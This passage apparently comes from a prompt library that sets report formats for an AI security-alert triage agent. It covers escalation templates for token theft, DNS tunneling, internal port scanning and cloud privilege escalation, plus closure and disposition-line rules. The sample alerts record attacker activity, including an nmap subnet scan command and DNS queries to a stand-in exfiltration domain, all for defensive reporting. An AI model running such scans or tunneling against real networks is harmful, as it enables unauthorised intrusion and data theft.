>   - [VirusTotal](https://www.virustotal.com/gui/domain/login-fake-portal.com) — 22/88 malicious
> * Delivery Status: `Delivered` | User Action: `Clicked`
> * Context: User clicked link within 3 minutes of delivery; authentication headers indicate direct spoofing attempt.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Initial Access / Credential Access — [[T1566.002](https://attack.mitre.org/techniques/T1566/002/)] Spearphishing Link / [[T1056](https://attack.mitre.org/techniques/T1056/)] Input Capture
> * Attack Path: [Spoofed Sender & Failed Auth] → [User Clicked Credential Harvesting Link] → [Credential / Session Compromise]
> ***
> #### What is Recommended
> * Purge email message with subject `Overdue Invoice #99281 - Immediate Payment Required` from all mailboxes via M365 Security Center
> * Block sender domain `evil-domain[.]com` and IP `45[.]12[.]88[.]4` on Email Gateway
> * Block credential harvesting domain `login-fake-portal[.]com` on Edge Proxy and DNS resolver
> * Revoke active sessions and reset credentials for `ceo@acme-corp.com`
> * Inspect Entra sign-in and audit logs for `ceo@acme-corp.com` for anomalous post-click authentications
> ```
> ```

---

### 7.4 Identity / Sign-in Escalation (AiTM / Token Theft)
#rule-class/identity #escalation-format

> [!warning] Trigger Condition
> The agent escalates a sign-in / identity alert — valid only on a named trigger actually met (see 3.1), never on "couldn't confirm benign".

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Identity / Sign-in):** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper (escalate only on verified triggers: MFA failed/absent, Entra risk `High`, unmanaged/non-compliant device, impossible travel, or AiTM/token replay). Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed identity telemetry (combined `User (UPN) | Time (UTC)` line, sign-in result, defanged source IP with ASN and location plus typed VT, device management and compliance state, MFA and Conditional Access status, Entra sign-in risk level, and token anomaly signal; omit irrelevant/absent fields without `N/A`) with **Context** capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (e.g. `T1078 Valid Accounts` / `T1539 Steal Web Session Cookie`) and one Attack Path arrow chain (`[auth outcome + risk] → [session / token control] → [inbox rule / OAuth persistence / lateral access]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Revoke`, `Reset`, `Require`, `Inspect`, `Remove`) with specific user/token/rule scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## High Priority
> ***
> #### What was Observed
> Entra ID Protection alerted on `Entra ID Impossible Travel & Token Reuse` with the following details:
> * User (UPN): `finance.admin@acme-corp.com` | Time (UTC): `2026-07-29 08:15:00Z`
> * Sign-in Result: `Success`
> * Source IP: `185[.]220[.]101[.]5` | ASN: `AS208294 (TOR Exit Node)` | Location: `Frankfurt, Germany`
>   - [VirusTotal](https://www.virustotal.com/gui/ip-address/185.220.101.5) — 19/88 malicious
> * Device State: `Unmanaged` | Compliance: `Non-compliant`
> * MFA Status: `Satisfied (Token Replay Claim)` | Conditional Access: `Success`
> * Entra Sign-in Risk: `High`
> * Anomaly: `Stolen session cookie replayed from novel ASN 5 mins after legitimate US sign-in`
> * Context: Session token issued to managed US laptop observed replaying from Frankfurt TOR exit node without fresh MFA prompt.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Initial Access / Defense Evasion — [[T1078](https://attack.mitre.org/techniques/T1078/)] Valid Accounts / [[T1539](https://attack.mitre.org/techniques/T1539/)] Steal Web Session Cookie
> * Attack Path: [Session Cookie Replay via TOR Exit Node] → [Unauthorized Cloud Session Access] → [Data Exfiltration / Tenant Persistence]
> ***
> #### What is Recommended
> * Revoke all active sessions and refresh tokens for user `finance.admin@acme-corp.com` via Entra ID Admin Center
> * Reset password for user `finance.admin@acme-corp.com` and require re-registration of MFA methods
> * Block source IP `185[.]220[.]101[.]5` and enforce Conditional Access policy blocking known anonymizers
> * Inspect Entra audit logs for unauthorized OAuth app consents or mailbox forwarding rule creations
> * Verify integrity of finance admin's primary workstation via EDR for initial infostealer presence
> ```
> ```

---

### 7.5 Network C2 / Tunneling Escalation
#rule-class/network #escalation-format

> [!warning] Trigger Condition
> The agent escalates a C2 / tunneling / exfil detection (unsafe-to-suppress class) with generic fields or a "no exfil channel" claim.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Network C2 / Tunneling):** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper (unsafe-to-suppress class; floor is Medium minimum absent documented FP precedent). Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed network telemetry (combined `Host | User | Time (UTC)` line, originating process name and cmdline, defanged destination FQDN/IP with typed VT linking the registrable domain, protocol, encoded subdomain/beacon payload sample, and traffic volume/beacon metrics; omit irrelevant/absent fields without `N/A`; never claim "no exfil channel" for encoded queries) with **Context** capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (e.g. `T1071.004 DNS`) and one Attack Path arrow chain (`[process execution / query] → [DNS tunneling beacon / C2 channel] → [data exfiltration / remote control]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Block`, `Isolate`, `Terminate`, `Hunt`) with specific firewall/DNS/EDR scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## Medium Priority
> ***
> #### What was Observed
> CrowdStrike Falcon alerted on `DNS Tunneling / Encoded Subdomain Query` with the following details:
> * Host: `SRV-DB-02.corp.internal` | Time (UTC): `2026-07-29 08:20:00Z`
> * Process: `unknown_svc.exe` | Command Line: `unknown_svc.exe --daemon`
> * Destination: `7a66787961[.]tunnel[.]bad-exfil[.]net`
>   - [VirusTotal](https://www.virustotal.com/gui/domain/bad-exfil.net) — 8/85 malicious
> * Protocol / Query: `DNS (TXT)` | `7a66787961.tunnel.bad-exfil.net` (high-entropy hex payload)
> * Traffic Metrics: `142 queries in 10 mins (uniform 4.2s interval)`
> * Context: Unexplained periodic TXT queries originating from database server; single process responsible for all lookups.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Command and Control / Exfiltration — [[T1071.004](https://attack.mitre.org/techniques/T1071/004/)] DNS / [[T1048.003](https://attack.mitre.org/techniques/T1048/003/)] Exfiltration Over DNS
> * Attack Path: [Unsigned Service Execution] → [High-Entropy DNS Tunneling Beacon] → [C2 Command Channel / Data Exfiltration]
> ***
> #### What is Recommended
> * Block destination domain `bad-exfil[.]net` and subdomains on Internal DNS Resolvers and Edge Firewall
> * Isolate server `SRV-DB-02.corp.internal` via EDR console pending process triage
> * Terminate process `unknown_svc.exe` and capture memory dump / executable for reverse engineering
> * Hunt DNS server logs across environment for queries resolving to `*.bad-exfil[.]net`
> ```
> ```

---

### 7.6 Recon / Scanner Escalation (Unauthorized Only)
#rule-class/recon #escalation-format

> [!warning] Trigger Condition
> The agent escalates scan / enumeration / lateral behavior — valid only AFTER host role (see 3.3) confirms the source is NOT a sanctioned scanner / RMM / jump box.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Recon / Scanner):** Confirm host role first (if sanctioned scanner/RMM, suppress/close). If unauthorized internal host, do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper. Maintain a hard budget: **What was Observed** is ≤8 fact lines (Source host | User | Time (UTC) + confirmed workstation role; Targets enumerated; Protocol/Port; Default-credential wordlist if present; Fan-out velocity; Auth success state; Context ≤2 bullets; omit irrelevant/absent fields without `N/A`). **What is the Risk** EXACTLY 2 lines: MITRE (Discovery / Brute Force) and Attack Path (`[unauthorized enumeration] → [target mapped] → [lateral movement / initial access]`). **What is Recommended** ≤5 imperative lines (`Isolate`, `Reset`, `Block`, `Hunt`) with specific endpoint/network scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## Medium Priority
> ***
> #### What was Observed
> Palo Alto Networks alerted on `Internal Port Scan & Lateral Enumeration` with the following details:
> * Host: `HR-LAPTOP-09` | User: `CORP\j.doe` | Time (UTC): `2026-07-29 09:30:00Z` (Confirmed Standard Workstation)
> * Activity / Event: `Port Scan / SMB & RDP Enumeration`
> * Targets: `10.100.4.0/24 (38 internal subnet hosts probed on ports 445/3389)`
> * Process: `nmap.exe` | File Path: `C:\Users\j.doe\Downloads\nmap.exe`
> * Key Parameters: `nmap.exe -sS -p 445,3389 10.100.4.0/24`
> * Context: Source host is an HR department laptop with no authorized administrative or network scanning responsibilities.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Discovery / Lateral Movement — [[T1046](https://attack.mitre.org/techniques/T1046/)] Network Service Discovery / [[T1021](https://attack.mitre.org/techniques/T1021/)] Remote Services
> * Attack Path: [Standard Workstation Nmap Execution] → [Internal Subnet Port Mapping] → [Lateral Movement / Target Selection]
> ***
> #### What is Recommended
> * Isolate workstation `HR-LAPTOP-09` via EDR console
> * Terminate process `nmap.exe` and inspect user download folder for unapproved utilities
> * Verify with user `CORP\j.doe` and supervisor whether network discovery testing was authorized
> * Hunt EDR logs on `HR-LAPTOP-09` for precursor phishing attachments, browser downloads, or credential dumping
> * Audit SMB and RDP authentication logs on target subnet `10.100.4.0/24` for successful logins from `HR-LAPTOP-09`
> ```
> ```

---

### 7.7 Generic / Unclassified Escalation Format (Fallback)
#rule-class/generic #escalation-format #fallback-template

> [!warning] Trigger Condition
> The agent escalates an alert from an uncovered or custom alert class (e.g. cloud IAM, DLP, web application, custom SIEM) without using a structured field layout or by inventing an invalid per-class structure.

> [!quote] Copyable Prompt Snippet
> ```markdown
> **Format & Grounding Preamble (Generic / Unclassified):** Do not ask questions, present options, or seek confirmation. Format strictly and correct the current output using the following template, emitting ONLY the finished 3-section escalation block under `## [Low / Medium / High] Priority` with no conversational wrapper for any uncovered alert class (cloud IAM, DLP, web application, custom SIEM). Maintain a hard budget: **What was Observed** is ≤8 fact lines of parsed telemetry (combined `Anchor Entity | Time (UTC)` line, activity/event name, primary subject/actor, target/resource, key parameters/payloads, defanged network/hash IOC with typed VT, and anomaly signal; omit irrelevant/absent fields without `N/A`) with **Context** capped at ≤2 bullets (1-sentence plausible explanation for unexplained activity or telemetry gap; never internal ROE/handling mechanics). **What is the Risk** must be EXACTLY two lines: one MITRE ATT&CK line (cap 2–3 evidence-backed sub-techniques) and one Attack Path arrow chain (`[observed action / anomaly] → [immediate capability / exposure] → [downstream security impact]`). **What is Recommended** must be ≤5 lines total, each starting with an imperative action verb (`Isolate`, `Revoke`, `Block`, `Quarantine`, `Reset`, `Hunt`) with specific entity/resource scope—sensible, immediately actionable, never generic filler ("notify customer", "monitor").
> 
> ```markdown
> ## High Priority
> ***
> #### What was Observed
> AWS CloudTrail alerted on `CloudAdmin IAM Policy Escalation` with the following details:
> * Anchor / Entity: `arn:aws:iam::123456789012:user/svc_cloud_deploy` | Time (UTC): `2026-07-30 15:30:00Z`
> * Activity / Event: `AttachUserPolicy`
> * Primary Subject / Actor: `svc_cloud_deploy` (Deployment Service Account)
> * Target / Resource: `AdministratorAccess` (Full Admin Policy)
> * Key Parameters: `PolicyArn: arn:aws:iam::aws:policy/AdministratorAccess`
> * Network / Indicator: `198[.]51[.]100[.]44` (Novel Non-Corporate IP)
>   - [VirusTotal](https://www.virustotal.com/gui/ip-address/198.51.100.44) — 7/88 malicious
> * Anomaly Signal: `Service account attached administrative privileges outside automated Terraform CI/CD pipeline`
> * Context: CI/CD role assumed from external unauthorized hosting provider IP rather than AWS GitHub Actions runner.
> ***
> #### What is the Risk
> * MITRE ATT&CK: Privilege Escalation / Persistence — [[T1098.003](https://attack.mitre.org/techniques/T1098/003/)] Additional Cloud Roles / [[T1078.004](https://attack.mitre.org/techniques/T1078/004/)] Cloud Accounts
> * Attack Path: [Service Account Key Compromise] → [Direct AdministratorAccess Policy Attachment] → [Full Cloud Infrastructure Takeover]
> ***
> #### What is Recommended
> * Detach policy `AdministratorAccess` from IAM user `svc_cloud_deploy` immediately
> * Deactivate and delete compromised AWS access key `AKIA...` for `svc_cloud_deploy`
> * Revoke all active AWS STS federated sessions for `svc_cloud_deploy`
> * Block source IP `198[.]51[.]100[.]44` on AWS WAF and Network ACLs
> * Audit CloudTrail logs for unauthorized EC2, S3, or Lambda resource modifications during the elevated session window
> * If this was expected, the alert may be closed with a comment.   [benign/expected/intent-dependent ONLY — omit on High and on confirmed/strongly-suspicious]
> ```
> ```

---

### 7.8 Orchestration & Filter Creation Artifact Format (Route 2)
#formatting/orchestration #filter-creation #kvp-table

> [!warning] Trigger Condition
> The agent emits a Route 2 durable filter creation or suppression artifact.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Format the Orchestration & Filter Creation artifact strictly per Megaprompt standards:
> Line 1: `DISPOSITION: Benign · Confirmed · Filter-Close · ROUTE 2`
> 
> ```markdown
> ### Orchestration Justification
> **Title:** [detection + benign pattern — e.g. `Notepad→Edge Workday login handoff (CS - Notepad spawning processes)`]
> **Type:** [net-new filter / filter modification / feed-based suppression / auto-routed playbook / alert comment playbook / event hint / temp filter]
> **Suppresses:** [ONE sentence — by stable anchor, never a per-event ID]
> **Why safe:** [why benign AND why a TP variant still alerts, 1–3 sentences. LOLBin/behavioral rule: benign rests on the BEHAVIOR (what the command decoded/executed, shown expected), never the parent's signature or a clean AV verdict on the parent.]
> 
> **Filter Logic (KVP):**
> Field                      Operator           Value
> [2–4 rows, strongest anchor first; e.g. `InitiatingProcessFileName`, `ProcessCommandLine`]
> ```
> Delete all user dossiers, scope-fit analysis, CORR history blocks, or residual risk lines.
> ```

---

### 7.9 Route 3: Manual Closing Artifact Format (Internal Route 3)
#formatting/manual-close #route-3 #internal-close

> [!warning] Trigger Condition
> The agent emits a Route 3 manual-closure artifact for a benign or benign-leaning alert that is ineligible for a durable filter (<2 stable anchors, filter too broad, or same-entity test fails).

> [!quote] Copyable Prompt Snippet
> ```markdown
> Format the Route 3 Manual Closing artifact strictly per Megaprompt standards:
> Line 1: `DISPOSITION: [verdict] · [confirmed/indicated/unconfirmed] · Filter-Close · ROUTE 3`
> 
> ```markdown
> ### Manually Closing
> [2–4 sentences, ONE paragraph block — no sub-headers, no `Why this route fits` / `Grounded facts` / `Close rationale` sections, no bulleted fact list. State: what fired (`rule` + pattern), the specific benign evidence, and why no durable filter is safe (only volatile identifiers distinguish it / a viable filter would suppress TPs / would break on cmdline variation / same-host recurrence is the likely TP). CORR stated.]
> [Gaps, if any, in ONE trailing line — never one bullet per field: `[gap: no same-entity sign-in / MFA / device / auth-registration record retrieved]`.]
> [If recurrence frequent: one line — tuning request with sample volume.]
> ```
> Delete all self-authored sub-headers, bulleted fact lists, or extra explanatory blocks.
> ```

---

### 7.10 Line 1 Mandatory Disposition Line Contract
#formatting/disposition #line-1 #disposition-header

> [!warning] Trigger Condition
> The agent emits an artifact without the mandatory Line 1 four-field disposition header, invents invalid verdict strings (e.g. `Inconclusive - Evidence Gap`, `Unknown`), or includes intro narration / confirmation questions before Line 1.

> [!quote] Copyable Prompt Snippet
> ```markdown
> Line 1, all four fields REQUIRED — never just the route:
> `DISPOSITION: [Verdict] · [Confidence] · [Priority] · ROUTE [1 Escalation / 2 Orchestration / 3 Manual Closure]`
> 
> * **Verdict:** MUST be strictly `Malicious`, `Suspicious`, or `Benign`. **FORBIDDEN:** `Inconclusive`, `Inconclusive - Evidence Gap`, `Evidence Gap`, `Unknown`, `Undetermined`, `Informational`. (Record evidence gaps strictly as `[gap: ...]` inside Context with Confidence set to `Unconfirmed` or `Indicated`).
> * **Confidence:** MUST be strictly `Confirmed`, `Indicated`, or `Unconfirmed`.
> * **Priority:** MUST be strictly `Filter-Close`, `Low`, `Medium`, or `High`.
> * **Route:** MUST be strictly `ROUTE 1 Escalation`, `ROUTE 2 Orchestration`, or `ROUTE 3 Manual Closure`.
> 
> A disposition line missing verdict, confidence, priority, or route, or using non-canonical names, is an output failure.
> Immediately follow Line 1 with the single artifact for the route, exactly per the formats — ONLY the sections that appear in that format. Reasoning stays silent. Nothing before line 1; nothing after the artifact.
> ```

